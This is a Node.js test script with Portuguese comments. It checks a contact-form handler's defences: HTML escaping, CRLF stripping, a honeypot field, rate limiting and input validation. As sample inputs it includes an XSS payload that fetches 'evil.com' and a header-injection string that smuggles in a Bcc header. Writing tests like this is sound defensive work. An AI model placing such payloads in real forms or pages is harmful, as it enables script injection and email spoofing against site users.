import http from 'http';
import assert from 'node:assert/strict';

// Defesas extraídas para validação técnica isolada
function escapeHtml(str) {
  if (typeof str !== 'string') return '';
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

function sanitizeSingleLine(str) {
  if (typeof str !== 'string') return '';
  return str.replace(/[\r\n\t]+/g, ' ').trim();
}

const rateLimitMap = new Map();
const RATE_LIMIT_WINDOW = 5 * 60 * 1000;
const MAX_REQUESTS_PER_WINDOW = 3;

function checkRateLimit(ip) {
  const now = Date.now();
  const record = rateLimitMap.get(ip) || { count: 0, resetTime: now };

  if (now - record.resetTime > RATE_LIMIT_WINDOW) {
    record.count = 1;
    record.resetTime = now;
    rateLimitMap.set(ip, record);
    return true;
  }

  if (record.count >= MAX_REQUESTS_PER_WINDOW) {
    return false;
  }

  record.count += 1;
  rateLimitMap.set(ip, record);
  return true;
}

// Simulador do Handler Blindado de Contato com rastreador de chamadas à Resend
let resendCallCount = 0;
async function contactHandler(req, res) {
  if (req.method !== 'POST') {
    res.statusCode = 405;
    return res.end(JSON.stringify({ error: 'Método não permitido.' }));
  }

  const body = req.body || {};
  const { name, email, message, company_hp } = body;

  // 1. Anti-Bot Honeypot
  if (company_hp && String(company_hp).trim() !== '') {
    res.statusCode = 200;
    return res.end(JSON.stringify({ success: true, message: 'Mensagem recebida.' }));
  }

  // 2. Rate Limiting por IP
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '127.0.0.1';
  if (!checkRateLimit(clientIp)) {
    res.statusCode = 429;
    res.setHeader('Retry-After', '300');
    return res.end(JSON.stringify({ error: 'Muitas mensagens enviadas recentemente.' }));
  }

  // 3. Validação de campos obrigatórios
  if (!name || !email || !message) {
    res.statusCode = 400;
    return res.end(JSON.stringify({ error: 'Faltam campos obrigatórios.' }));
  }

  // 4. Sanitização e Validação
  const cleanRawName = sanitizeSingleLine(String(name));
  const cleanRawEmail = sanitizeSingleLine(String(email));
  const rawMessage = String(message).trim();

  if (cleanRawName.length < 2 || cleanRawName.length > 100) {
    res.statusCode = 400;
    return res.end(JSON.stringify({ error: 'O nome deve ter entre 2 e 100 caracteres.' }));
  }

  const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
  if (cleanRawEmail.length > 150 || !emailRegex.test(cleanRawEmail)) {
    res.statusCode = 400;
    return res.end(JSON.stringify({ error: 'Formato de e-mail inválido.' }));
  }

  if (rawMessage.length < 5 || rawMessage.length > 3000) {
    res.statusCode = 400;
    return res.end(JSON.stringify({ error: 'A mensagem deve ter entre 5 e 3000 caracteres.' }));
  }

  // 5. Escapar HTML para evitar XSS/HTML Injection
  const safeName = escapeHtml(cleanRawName);
  const safeEmail = escapeHtml(cleanRawEmail);
  const safeMessage = escapeHtml(rawMessage);

  // Simulação de envio Resend
  resendCallCount++;

  res.statusCode = 200;
  return res.end(JSON.stringify({
    success: true,
    data: { safeName, safeEmail, safeMessage }
  }));
}

const server = http.createServer((req, res) => {
  let bodyStr = '';
  req.on('data', chunk => { bodyStr += chunk; });
  req.on('end', () => {
    try {
      req.body = bodyStr ? JSON.parse(bodyStr) : {};
    } catch {
      req.body = {};
    }
    res.setHeader('Content-Type', 'application/json');
    contactHandler(req, res);
  });
});

server.listen(0, async () => {
  const port = server.address().port;
  const baseUrl = `http://localhost:${port}`;

  console.log(`\n🛡️ [PROVA TÉCNICA - BLINDAGEM DO FORMULÁRIO] Executando testes na porta ${port}...\n`);

  try {
    // -------------------------------------------------------------
    // TESTE 1: Defesa contra HTML Injection e XSS
    // -------------------------------------------------------------
    const xssPayload = {
      name: '<script>alert("xss")</script>',
      email: 'hacker@malicioso.com',
      message: '<img src=x onerror=fetch("evil.com")> <b>Aviso urgente</b>'
    };
    const resXss = await fetch(baseUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-forwarded-for': '10.0.0.1' },
      body: JSON.stringify(xssPayload)
    });
    const bodyXss = await resXss.json();
    assert.equal(resXss.status, 200);
    assert.ok(!bodyXss.data.safeName.includes('<script>'), 'FALHA: Script tag não foi neutralizada no nome');
    assert.ok(bodyXss.data.safeName.includes('&lt;script&gt;'), 'FALHA: Entidade HTML ausente no nome');
    assert.ok(!bodyXss.data.safeMessage.includes('<img'), 'FALHA: Tag img não foi neutralizada na mensagem');
    console.log('  ✔️ [PASS] HTML Injection / XSS: Tags maliciosas completamente neutralizadas com escapeHtml');

    // -------------------------------------------------------------
    // TESTE 2: Defesa contra CRLF Injection (Header Injection)
    // -------------------------------------------------------------
    const crlfName = 'Leonardo\r\nBcc: vitima@alvo.com\r\nSubject: Spoofed';
    const sanitizedName = sanitizeSingleLine(crlfName);
    assert.ok(!sanitizedName.includes('\r'), 'FALHA: Carriage return presente');
    assert.ok(!sanitizedName.includes('\n'), 'FALHA: Line feed presente');
    assert.equal(sanitizedName, 'Leonardo Bcc: vitima@alvo.com Subject: Spoofed');
    console.log('  ✔️ [PASS] CRLF Injection: Quebras de linha e injeção de headers SMTP removidas com sucesso');

    // -------------------------------------------------------------
    // TESTE 3: Defesa Anti-Bot Silenciosa (Honeypot)
    // -------------------------------------------------------------
    const callsBefore = resendCallCount;
    const botPayload = {
      name: 'Spam Bot 3000',
      email: 'bot@spammer.net',
      message: 'Compre bitcoin agora no link!',
      company_hp: 'Eu sou um bot preenchendo todos os campos'
    };
    const resBot = await fetch(baseUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-forwarded-for': '10.0.0.2' },
      body: JSON.stringify(botPayload)
    });
    assert.equal(resBot.status, 200, 'FALHA: Bot deveria receber 200 silencioso');
    assert.equal(resendCallCount, callsBefore, 'FALHA DE SEGURANÇA: Bot consumiu cota da Resend!');
    console.log('  ✔️ [PASS] Honeypot Anti-Bot: Robô descartado silenciosamente sem consumir cota de e-mails da Resend');

    // -------------------------------------------------------------
    // TESTE 4: Proteção contra Esgotamento de Cota (Rate Limiting)
    // -------------------------------------------------------------
    const ipFlood = '192.168.10.50';
    const normalPayload = { name: 'Cliente Legítimo', email: 'cliente@empresa.com', message: 'Olá, gostaria de um orçamento.' };

    // 3 requisições permitidas
    for (let i = 1; i <= 3; i++) {
      const resOk = await fetch(baseUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'x-forwarded-for': ipFlood },
        body: JSON.stringify(normalPayload)
      });
      assert.equal(resOk.status, 200, `FALHA: Requisição ${i} dentro do limite deveria passar`);
    }

    // 4ª requisição deve ser bloqueada por rate limit (429)
    const resBlocked = await fetch(baseUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-forwarded-for': ipFlood },
      body: JSON.stringify(normalPayload)
    });
    assert.equal(resBlocked.status, 429, 'FALHA DE SEGURANÇA: Rate limit falhou ao bloquear flood de e-mails!');
    assert.equal(resBlocked.headers.get('retry-after'), '300');
    console.log('  ✔️ [PASS] Rate Limiting: 4ª tentativa consecutiva bloqueada com HTTP 429 Too Many Requests');

    // -------------------------------------------------------------
    // TESTE 5: Validação de Formato e Tamanho de Dados
    // -------------------------------------------------------------
    const invalidEmailRes = await fetch(baseUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-forwarded-for': '10.0.0.3' },
      body: JSON.stringify({ name: 'Leo', email: 'email_invalido@@com', message: 'Mensagem de teste' })
    });
    assert.equal(invalidEmailRes.status, 400, 'FALHA: E-mail inválido deveria retornar 400');

    const hugeMessageRes = await fetch(baseUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-forwarded-for': '10.0.0.4' },
      body: JSON.stringify({ name: 'Leo', email: 'leo@valido.com', message: 'A'.repeat(3001) })
    });
    assert.equal(hugeMessageRes.status, 400, 'FALHA: Mensagem gigante acima de 3000 caracteres deveria retornar 400');
    console.log('  ✔️ [PASS] Validação de Dados: Payloads anômalos e e-mails malformados rejeitados com 400 Bad Request');

    console.log('\n✅ [SUCESSO] Todas as defesas do formulário foram validadas com sucesso!\n');
  } catch (err) {
    console.error('❌ Falha nos testes do formulário:', err);
    process.exitCode = 1;
  } finally {
    server.close();
  }
});
